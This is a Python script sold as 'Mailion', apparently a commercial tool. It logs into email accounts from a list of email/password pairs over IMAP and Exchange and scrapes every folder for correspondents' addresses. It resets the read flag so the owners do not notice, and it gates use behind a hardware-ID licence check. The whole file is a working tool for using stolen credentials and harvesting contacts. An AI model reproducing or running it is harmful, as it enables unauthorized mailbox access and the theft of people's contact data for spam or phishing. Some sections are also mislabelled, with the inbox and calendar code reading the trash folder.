from email.message import EmailMessage
import subprocess
import requests, smtplib
from bs4 import BeautifulSoup
import imaplib
from exchangelib import Credentials, Account
import email as xmail
import csv
import re
import time 

from functools import cache

email_regex = re.compile(r"[\w\.-]+@[\w\.-]+")
ascii_image = '''
                +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                            MAILION EMAIL VALIDATOR
                Other products available are:
                - Mailion Sender
                - Mailion Mail Fetcher
                - Mailion Mail Validator
                            ------------------------
                               Licensed to: AK
                            ---------contact--------
                         Telegram: t.me/mailon_official
                +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                '''
print(ascii_image)

@cache
def main_function():

    fetching = 0
    fetched_mail = 0
    not_fetched_mail = 0

    real_email_password_list = []
    with open("email_address_password.csv") as file:
        reader = csv.reader(file)
        next(reader)
        email_password_list = []
        for row in reader:
            email_password_list.append(row)

        for item in email_password_list:
            real_email_password_list.append(item)

    for item in range(0, len(real_email_password_list)):
        try:
            email_address = real_email_password_list[item][0]
            email_password = real_email_password_list[item][1]
        except Exception as m:
            pass
        else:
            index1 = email_address.index("@")
            NAMEDOMAIN = email_address[index1 + 1:]
            
            try:
                imap_server = "outlook.office365.com"
                imap = imaplib.IMAP4_SSL(host=imap_server)
                imap.login(email_address, email_password)
            except Exception as f:
                try:
                    imap_server = f"imap.{NAMEDOMAIN}"
                    imap = imaplib.IMAP4_SSL(host=imap_server)
                    imap.login(email_address, email_password)
                except Exception as e:
                    try:
                        imap_server = f"mail.{NAMEDOMAIN}"
                        imap = imaplib.IMAP4_SSL(host=imap_server)
                        imap.login(email_address, email_password)
                    except Exception as a:
                        try:
                            username = email_address[:index1]
                            credentials = Credentials(username, email_password)
                            account = Account(email_address, credentials=credentials, autodiscover=True)
                        except Exception as e:
                            fetching += 1
                            not_fetched_mail += 1
                            mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                            print(mail_fetched)

                        else:
                            print("___ inbox searching folder")

                            try:
                                inbox_data = " "
                                for email in account.trash.all().order_by('-datetime_received')[:300]:
                                    account.is_read = False
                                    inbox_info = str(email_regex.findall(str(email)))
                                    inbox_data += inbox_info + "\n"
                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass
                            else:
                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(inbox_data)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(inbox_data)
                                        pass
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                print("___ sent searching folder")
                                sent_data = " "
                                for email in account.sent.all().order_by('-datetime_received')[:300]:
                                    sent_info = str(email_regex.findall(str(email)))
                                    sent_data += sent_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(sent_data)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(sent_data)
                                        pass
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                print("___ trash searching folder")
                                trash_data = " "
                                for email in account.trash.all().order_by('-datetime_received')[:300]:
                                    trash_info = str(email_regex.findall(str(email)))
                                    trash_data += trash_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(trash_data)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(trash_data)
                                        pass
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                print("___ calender searching folder")
                                calendar_data = " "
                                for email in account.trash.all().order_by('-datetime_received')[:300]:
                                    calender_info = str(email_regex.findall(str(email)))
                                    calendar_data += calender_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(calendar_data)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(calendar_data)
                                        pass
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    Total fetched mail: {fetched_mail}
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                draft_data = " "
                                for email in account.drafts.all().order_by('-datetime_received')[:300]:
                                    draft_info = str(email_regex.findall(str(email)))
                                    draft_data += draft_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                fetching += 1
                                fetched_mail += 1
                                with open(f"Results for-{email_address}.txt", "a") as file:
                                    file.write(draft_data)
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                outbox_data = " "
                                for email in account.outbox.all().order_by('-datetime_received')[:500]:
                                    outbox_info = str(email_regex.findall(str(email)))
                                    outbox_data += outbox_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                fetching += 1
                                fetched_mail += 1
                                with open(f"Results for-{email_address}.txt", "a") as file:
                                    file.write(outbox_data)
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                                    pass

                            try:
                                junk_data = " "
                                for email in account.junk.all().order_by('-datetime_received')[:300]:
                                    junk_info = str(email_regex.findall(str(email)))
                                    junk_data += junk_info

                            except Exception as e:
                                
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Can't save contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                fetching += 1
                                fetched_mail += 1
                                with open(f"Results for-{email_address}.txt", "a") as file:
                                    file.write(junk_data)
                                mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                print(mail_fetched) 
                                pass

                            try:
                                tasks_data = " "
                                for email in account.tasks.all().order_by('-datetime_received')[:300]:
                                    tasks_info = str(email_regex.findall(str(email)))
                                    tasks_data += tasks_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            else:
                                fetching += 1
                                fetched_mail += 1
                                with open(f"Results for-{email_address}.txt", "a") as file:
                                    file.write(tasks_data)
                                mail_fetched = f'''
                                    Total fetched mail: {fetched_mail}
                                    saving {fetching} contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass

                            try:
                                contacts_data = " "
                                for email in account.contacts.all().order_by('-datetime_received')[:300]:
                                    contacts_info = str(email_regex.findall(str(email)))
                                    contacts_data += contacts_info

                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass
                            else:
                                fetching += 1
                                fetched_mail += 1
                                with open(f"Results for-{email_address}.txt", "a") as file:
                                    file.write(contacts_data)
                                mail_fetched = f'''
                                    Total fetched mail: {fetched_mail}
                                    saving {fetching} contacts of {email_address}
                                    '''
                                print(mail_fetched)
                                pass
                    else:
                        print(f"searching {email_address} folders")
                        _, list_data = imap.list()
                        list_value = []
                        for item in list_data:
                            a = str(item).index(")")
                            data = item[a + 2:]
                            value = data.decode('UTF-8', 'ignore')
                            list_value.append(value)
                        for element in list_value:
                            try:
                                strip_element = element.strip()
                                imap.select(strip_element)
                                _, message_numbers_raw = imap.search(None, "ALL")
                                message_numbers = message_numbers_raw[0].split()
                            except Exception as e:
                                fetching += 1
                                not_fetched_mail += 1
                                mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                                print(mail_fetched)

                            else:
                                for message_number in message_numbers:
                                    imap.store(message_number, '-FLAGS', '\SEEN')
                                    _, message_data = imap.fetch(message_number, '(RFC822)')
                                    message = xmail.message_from_bytes(message_data[0][1])
                                    from_data = message.get('From')
                                    to_data = message.get('To')
                                    bcc_data = message.get("BCC")
                                    ccc_data = message.get("cc")
                                    value = f"{from_data}\n{to_data}\n{bcc_data}\n{ccc_data}"
                                    data_info = str(email_regex.findall(str(value)))
                                    try:
                                        with open(f"Results for-{email_address}.txt", "a") as file:
                                            file.write(data_info)
                                    except FileNotFoundError:
                                        with open(f"Results for-{email_address}.txt", "w") as file:
                                            file.write(data_info)
                                    else:
                                        fetching += 1
                                        fetched_mail += 1
                                        mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
                else:
                    print(f"searching {email_address} folders")
                    _, list_data = imap.list()
                    list_value = []
                    for item in list_data:
                        a = str(item).index(")")
                        data = item[a + 2:]
                        value = data.decode('UTF-8', 'ignore')
                        list_value.append(value)
                    for element in list_value:
                        try:
                            strip_element = element.strip()
                            imap.select(strip_element)
                            _, message_numbers_raw = imap.search(None, "ALL")
                            message_numbers = message_numbers_raw[0].split()
                        except Exception as e:
                            fetching += 1
                            not_fetched_mail += 1
                            mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                            print(mail_fetched)

                        else:
                            for message_number in message_numbers:
                                imap.store(message_number, '-FLAGS', '\SEEN')
                                _, message_data = imap.fetch(message_number, '(RFC822)')
                                message = xmail.message_from_bytes(message_data[0][1])
                                from_data = message.get('From')
                                to_data = message.get('To')
                                bcc_data = message.get("BCC")
                                ccc_data = message.get("cc")
                                value = f"{from_data}\n{to_data}\n{bcc_data}\n{ccc_data}"
                                data_info = str(email_regex.findall(str(value)))

                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(data_info)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(data_info)
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)
            else:
                print(f"searching {email_address} folders")
                _, list_data = imap.list()
                list_value = []
                for item in list_data:
                    a = str(item).index(")")
                    data = item[a + 2:]
                    value = data.decode('UTF-8', 'ignore')
                    list_value.append(value)
                for element in list_value:
                    try:
                        strip_element = element.strip()
                        imap.select(strip_element)
                        _, message_numbers_raw = imap.search(None, "ALL")
                        message_numbers = message_numbers_raw[0].split()
                    except Exception as g:
                        fetching += 1
                        not_fetched_mail += 1
                        mail_fetched = f'''
                                    Cant't fetch contacts of {email_address}
                                    '''
                        print(mail_fetched)

                    else:
                        for message_number in message_numbers:
                            imap.store(message_number, '-FLAGS', '\SEEN')
                            _, message_data = imap.fetch(message_number, '(RFC822)')

                            try:
                                message = xmail.message_from_bytes(message_data[0][1])
                            except:
                                pass
                            else:
                                from_data = message.get('From')
                                to_data = message.get('To')
                                bcc_data = message.get("BCC")
                                ccc_data = message.get("cc")
                                value = f"{from_data}\n{to_data}\n{bcc_data}\n{ccc_data}"
                                data_info = str(email_regex.findall(str(value)))

                                try:
                                    with open(f"Results for-{email_address}.txt", "a") as file:
                                        file.write(data_info)
                                except FileNotFoundError:
                                    with open(f"Results for-{email_address}.txt", "w") as file:
                                        file.write(data_info)
                                else:
                                    fetching += 1
                                    fetched_mail += 1
                                    mail_fetched = f'''
                                    saving {fetching} contacts of {email_address}
                                    '''
                                    print(mail_fetched)

    if (item + 1) == len(real_email_password_list):
        mail_summary = f'''
            +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                           FETCHING COMPLETED
            +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                '''
        print(mail_summary)
        time.sleep(1000)

    
@cache
def check_hwid():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'),
                             'utf-8').split('\n')[1].strip()
    # 4C4C4544-0057-3010-8059-C2C04F544E32 
    if current_machine_id == "4C4C4544-0057-3010-8059-C2C04F544E32" or current_machine_id =="73D84373-5008-11E4-BDA1-C3DE60014060" or current_machine_id =="8D6D2C11-CC4F-4C9D-B50A-C3C65E0E1CC6":
        return True
    else:
        return False

@cache
def get_date():
    try:
        r = requests.get("https://www.calendardate.com/todays.htm")
    except requests.exceptions.ConnectionError:
        pass

    else:
        soup = BeautifulSoup(r.text, "html.parser")
        a = soup.find_all(id="tprg")[6].get_text()
        a = a.replace("-", "")
        return a

if check_hwid() == True:
    limit = 20991010
    try:
        current_date = int(get_date())
    except TypeError:
        poor_network = '''
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                           CHECK NETWORK, NO NETWORK AVAILABLE
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                    '''
        print(poor_network)
    else:
        if limit >= current_date:
            main_function()
            
        else:
            ascii_outdated = '''
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                                    APP OUTDATED
                              ---contact developer---
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                    '''
            print(ascii_outdated)
            time.sleep(1000)
else:
    ascii_unauthorised = '''
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                                 UNAUTHORIZED USER
                              ---contact developer---
                    +-+-+-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
                            '''
    print(ascii_unauthorised)
    time.sleep(1000)